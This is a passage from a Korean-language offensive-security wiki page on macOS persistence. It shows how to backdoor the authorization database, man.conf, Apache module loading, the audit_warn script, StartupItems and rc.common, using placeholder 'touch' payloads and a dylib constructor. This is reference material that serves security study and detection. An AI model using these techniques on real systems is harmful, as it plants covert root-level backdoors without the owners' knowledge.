<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**는 authorization framework에 **authorization을 위해 external mechanism을 호출해야 한다는 것**을 알립니다. 또한 **`privileged`**는 이를 root로 실행되도록 합니다.

다음과 같이 trigger합니다:
```bash
security authorize com.asdf.asdf
```
그리고 **staff group에는 sudo** access가 있어야 합니다(`/etc/sudoers`를 읽어 확인).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요하며 사용자가 man을 사용해야 함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`/private/etc/man.conf`**
- root 권한 필요
- **`/private/etc/man.conf`**: man이 사용될 때마다

#### 설명 및 Exploit

config file **`/private/etc/man.conf`**은 man documentation file을 열 때 사용할 binary/script를 지정합니다. 따라서 executable 경로를 수정하면 사용자가 man을 사용해 문서를 읽을 때마다 backdoor가 실행되도록 할 수 있습니다.<sup>[[31]](#references)</sup>

예를 들어 **`/private/etc/man.conf`**에 다음을 설정합니다:
```
MANPAGER /tmp/view
```
그런 다음 `/tmp/view`를 다음과 같이 생성합니다:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요하고 apache가 실행 중이어야 함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd에는 entitlements가 없음

#### 위치

- **`/etc/apache2/httpd.conf`**
- root 권한 필요
- 트리거: Apache2가 시작될 때

#### 설명 및 Exploit

`/etc/apache2/httpd.conf`에 다음과 같은 줄을 추가하여 module을 load하도록 지정할 수 있습니다:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
이렇게 하면 컴파일된 모듈이 Apache에 의해 로드됩니다. 단, **유효한 Apple 인증서로 서명**하거나 시스템에 **새로운 신뢰할 수 있는 인증서를 추가**한 다음 해당 인증서로 **서명**해야 합니다.

그런 다음 필요한 경우 서버가 시작되는지 확인하기 위해 다음을 실행할 수 있습니다:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb의 코드 예시:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요하고, auditd가 실행 중이어야 하며 warning을 발생시켜야 함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`/etc/security/audit_warn`**
- root 권한 필요
- **Trigger**: auditd가 warning을 감지할 때

#### 설명 및 Exploit

auditd가 warning을 감지할 때마다 **`/etc/security/audit_warn`** 스크립트가 **실행**됩니다. 따라서 이 파일에 payload를 추가할 수 있습니다.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n`을 사용하여 경고를 강제로 표시할 수 있습니다.

### Startup Items

> [!CAUTION] > **이는 deprecated 상태이므로 해당 디렉터리에서 아무것도 발견되지 않아야 합니다.**

**StartupItem**은 `/Library/StartupItems/` 또는 `/System/Library/StartupItems/` 중 하나에 위치해야 하는 디렉터리입니다. 이 디렉터리가 생성되면 다음 두 가지 파일을 포함해야 합니다.

1. **rc script**: startup 시 실행되는 shell script입니다.
2. `StartupParameters.plist`라는 이름의 **plist file**: 다양한 configuration settings를 포함합니다.

startup process가 이를 인식하고 사용할 수 있도록 rc script와 `StartupParameters.plist` file이 모두 **StartupItem** 디렉터리 안에 올바르게 배치되어 있는지 확인해야 합니다.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 내 macOS에서는 이 component를 찾을 수 없으므로 자세한 정보는 writeup을 확인하세요.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple에서 도입한 **emond**는 개발이 충분히 진행되지 않았거나 버려졌을 가능성이 있어 보이는 logging mechanism이지만, 여전히 접근할 수 있습니다. Mac administrator에게 특별히 유용하지는 않지만, 이 잘 알려지지 않은 service는 threat actor가 사용할 수 있는 은밀한 persistence method가 될 수 있으며, 대부분의 macOS admin이 알아차리지 못할 가능성이 높습니다.<sup>[[34]](#references)</sup>

**emond**의 존재를 알고 있다면 악의적인 사용을 식별하는 일은 간단합니다. 이 service의 system LaunchDaemon은 하나의 directory에서 실행할 scripts를 찾습니다. 이를 확인하려면 다음 command를 사용할 수 있습니다:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### 위치

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- root 필요
- **트리거**: XQuartz 사용 시

#### 설명 및 Exploit

XQuartz는 macOS에 **더 이상 설치되지 않으므로**, 자세한 정보는 writeup을 확인하세요.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> kext 설치는 root 권한이 있어도 매우 복잡하므로, exploit이 없다면 실용적인 sandbox-escape 또는 persistence 기법으로 간주되지 않습니다.

#### 위치

KEXT를 startup item으로 설치하려면 **다음 위치 중 하나에 설치해야 합니다**:

- `/System/Library/Extensions`
- OS X 운영 체제에 내장된 KEXT 파일
- `/Library/Extensions`
- 서드파티 software가 설치한 KEXT 파일

현재 로드된 kext 파일은 다음 명령으로 나열할 수 있습니다:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
[**kernel extensions에 대한 자세한 내용은 이 섹션을 확인하세요**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

정리글: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 위치

- **`/usr/local/bin/amstoold`**
- Root 필요

#### 설명 및 Exploitation

분명히 `/System/Library/LaunchAgents/com.apple.amstoold.plist`의 `plist`는 XPC service를 노출하면서 이 binary를 사용하고 있었습니다... 문제는 해당 binary가 존재하지 않았다는 것이므로, 그 위치에 무언가를 배치하면 XPC service가 호출될 때 해당 binary가 호출되도록 할 수 있었습니다.<sup>[[35]](#references)</sup>

더 이상 제 macOS에서는 이 항목을 찾을 수 없습니다.

### ~~xsanctl~~

정리글: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 위치

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root 필요
- **Trigger**: service가 실행될 때(드물게)

#### 설명 및 exploit

이 script가 실행되는 경우는 그리 흔하지 않은 것 같고 제 macOS에서도 찾을 수 없었으므로, 자세한 정보가 필요하다면 정리글을 확인하세요.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **최신 MacOS 버전에서는 작동하지 않습니다**

여기에도 **startup 시 실행될 commands를 배치할 수 있습니다.** 일반적인 rc.common script의 예:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence 기법 및 도구

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025년, Infostealer의 해](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [좋은 옛날의 LaunchAgents를 넘어서 - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [좋은 옛날의 LaunchAgents를 넘어서 - 18 - X11 및 XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [좋은 옛날의 LaunchAgents를 넘어서 - 21 - 다시 열린 애플리케이션](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [좋은 옛날의 LaunchAgents를 넘어서 - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [좋은 옛날의 LaunchAgents를 넘어서 - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [좋은 옛날의 LaunchAgents를 넘어서 - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [좋은 옛날의 LaunchAgents를 넘어서 - 22 - LoginHook 및 LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [좋은 옛날의 LaunchAgents를 넘어서 - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [좋은 옛날의 LaunchAgents를 넘어서 - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [좋은 옛날의 LaunchAgents를 넘어서 - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [좋은 옛날의 LaunchAgents를 넘어서 - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [좋은 옛날의 LaunchAgents를 넘어서 - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [좋은 옛날의 LaunchAgents를 넘어서 - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [좋은 옛날의 LaunchAgents를 넘어서 - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [좋은 옛날의 LaunchAgents를 넘어서 - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS에서 Persistence를 위한 Folder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [좋은 옛날의 LaunchAgents를 넘어서 - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [좋은 옛날의 LaunchAgents를 넘어서 - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [좋은 옛날의 LaunchAgents를 넘어서 - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [“Mac File Opener” Persistence 분석 (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [좋은 옛날의 LaunchAgents를 넘어서 - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Access 유지: macOS Persistence를 위한 Screensavers (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [좋은 옛날의 LaunchAgents를 넘어서 - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [좋은 옛날의 LaunchAgents를 넘어서 - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [좋은 옛날의 LaunchAgents를 넘어서 - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [좋은 옛날의 LaunchAgents를 넘어서 - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [좋은 옛날의 LaunchAgents를 넘어서 - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugins를 이용한 지속적인 Credential Theft (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [좋은 옛날의 LaunchAgents를 넘어서 - 30 - man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [좋은 옛날의 LaunchAgents를 넘어서 - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [좋은 옛날의 LaunchAgents를 넘어서 - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [좋은 옛날의 LaunchAgents를 넘어서 - 23 - emond, The Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [좋은 옛날의 LaunchAgents를 넘어서 - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [좋은 옛날의 LaunchAgents를 넘어서 - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
